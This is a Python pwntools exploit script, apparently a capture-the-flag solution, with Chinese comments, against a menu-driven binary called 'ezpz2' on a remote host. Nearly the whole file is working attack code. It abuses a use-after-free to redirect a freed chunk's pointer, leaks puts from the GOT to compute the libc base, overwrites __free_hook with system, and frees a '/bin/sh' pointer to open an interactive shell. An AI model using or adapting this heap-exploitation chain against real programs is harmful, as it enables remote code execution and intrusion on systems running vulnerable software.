from pwn import *

context.arch = 'amd64'

# 设置远程或本地进程
if args.R:
    p = remote('lmao.lol', 8003)
elif args.H:
    p = process('./ezpz2')
else:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '80']
    p = gdb.debug('./ezpz2',
                  gdbscript='''
                      b *delete_question
                      b *set_question
                      c
                      ''')

elf = ELF('./ezpz2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 使用 GOT 表中的 puts 地址
puts_got = elf.got['puts']

# 从 libc 中获取偏移地址
puts_offset = libc.symbols['puts']
system_offset = libc.symbols['system']
bin_sh_offset = next(libc.search(b'/bin/sh'))
free_hook_offset = libc.symbols['__free_hook']


# 函数封装
def create_question():
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"C")
    p.recvuntil(b"ID ")
    return p.recvline().strip()


def set_question(qid, payload):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"S")
    p.sendlineafter(b"Enter question id: ", qid)
    p.sendlineafter(b"Enter your question: ", payload)


def del_question(qid):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"D")
    p.sendlineafter(b"Enter question id: ", qid)


def ask_question(qid):
    p.sendlineafter(b"Enter your choice, (or press enter to refresh): ", b"A")
    p.sendlineafter(b"Enter question id: ", qid)



def padding(size):
    return cyclic(size * 8, alphabet=string.ascii_uppercase, n=8).encode()


def ret_addr(p, name):
    p.recvuntil(b"I have the answer perhaps: ")
    line = p.recvline().replace(b"'", b"").replace(b"\n", b"")
    addr = u64(line.ljust(8, b"\x00"))
    print('{} addr : {}'.format(name, hex(addr)))
    return addr


def leak_libc_base():
    qid0 = create_question()
    qid1 = create_question()
    del_question(qid0)
    del_question(qid1)

    set_question(qid0, padding(5) + p64(0x31) + padding(3) + p64(puts_got))
    ask_question(qid1)
    libc_addr = ret_addr(p, 'libc')

    libc_base = libc_addr - puts_offset
    return libc_base, qid0, qid1


def exploit(libc_base, qid0, qid1):
    system_addr = libc_base + system_offset
    free_hook_addr = libc_base + free_hook_offset
    bin_sh_addr = libc_base + bin_sh_offset

    set_question(qid0, padding(5) + p64(0x31) + padding(3) + p64(free_hook_addr))

    set_question(qid1, p64(system_addr))
    set_question(qid0, padding(5) + p64(0x31) + padding(3) + p64(bin_sh_addr))

    del_question(qid1)
    p.interactive()


libc_base, qid0, qid1 = leak_libc_base()
print(f"Calculated libc base address: {hex(libc_base)}")

exploit(libc_base, qid0, qid1)
